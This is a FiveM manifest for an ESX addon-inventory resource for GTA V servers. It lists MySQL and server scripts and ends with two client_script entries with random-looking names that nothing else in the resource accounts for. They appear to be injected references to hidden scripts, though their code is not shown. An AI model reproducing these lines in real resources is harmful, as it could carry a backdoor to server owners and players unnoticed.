fx_version 'adamant'

game 'gta5'

description 'ESX Addon Inventory'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/classes/addoninventory.lua',
	'server/main.lua'
}

dependency 'es_extended'


client_script 'PYOVJZ0VJaE.lua'

client_script "ph1ll1p.lua"